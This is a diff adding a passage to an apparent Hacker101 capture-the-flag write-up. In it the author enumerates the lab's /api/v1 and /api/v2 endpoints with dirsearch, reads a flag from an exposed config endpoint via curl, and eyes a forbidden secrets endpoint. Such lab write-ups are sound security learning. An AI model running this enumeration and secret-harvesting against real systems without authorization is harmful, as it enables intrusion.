@@ -131,5 +131,55 @@ Alright! A flag, and a bonus endpoint to boot. Anything there?
 %
 ```
 
-Maybe worth exploring. Possibly something we can explore in the v2 API as well?
+Maybe worth exploring. Possibly something we can explore in the v2 API as well? 
+Let's put a pin in that for the time being. We've got three out of eight flags,
+let's start back at the top 
+
+Let's hit the API endpoints we know about with `dirsearch` again:
+
+```
+% python3 dirsearch.py -u ${BASE_URL}/api/v1/
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266
+
+Target: https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com/
+
+[16:10:32] Scanning: api/v1/
+[16:11:13] 200 -   132B - /api/v1/config
+[16:11:13] 200 -   132B - /api/v1/config/
+[16:11:39] 403 -    51B - /api/v1/secrets
+[16:11:39] 403 -    51B - /api/v1/secrets/
+[16:11:41] 200 -    13B - /api/v1/status?full=true
+[16:11:41] 200 -    13B - /api/v1/status
+[16:11:41] 200 -    13B - /api/v1/status/
+[16:11:49] 400 -    49B - /api/v1/user
+[16:11:49] 400 -    49B - /api/v1/user/
+
+Task Completed
+% python3 dirsearch.py -u ${BASE_URL}/api/v2/
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266
+
+Target: https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com/
+
+[16:22:40] Scanning: api/v2/
+[16:23:57] 200 -    3KB - /api/v2/swagger.json                              
+[16:24:00] 400 -    51B - /api/v2/user                                      
+[16:24:00] 400 -    51B - /api/v2/user/                                     
+                                                                             
+Task Completed
+%
+% # That's something! 
+% curl ${BASE_URL}/api/v1/config 
+{"server":"Neptune","version":"1.3.94","private_key":"^FLAG^3b58b7d188df973cfebd140cb0a442c3c0eb67192c22e185920e848731101883$FLAG$"}%    
+```
+
+Halfway there! That secrets endpoint looks interesting, too - I think if we can 
+find a way to get admin access we could probably get a flag or two. 
 
